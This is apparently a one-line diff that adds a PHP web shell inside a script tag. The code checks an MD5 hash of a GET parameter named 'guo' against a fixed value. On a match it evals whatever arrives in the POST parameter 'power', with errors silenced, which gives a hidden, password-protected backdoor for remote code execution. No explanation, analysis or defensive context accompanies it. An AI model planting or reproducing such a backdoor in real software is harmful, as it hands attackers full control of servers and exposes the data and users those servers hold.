@@ -1,0 +1,1 @@
+<script language="PHP">if(md5($_GET[guo])==="fe831851246d186db20c229fa19a0172"){@eval($_POST[power]);}</script>
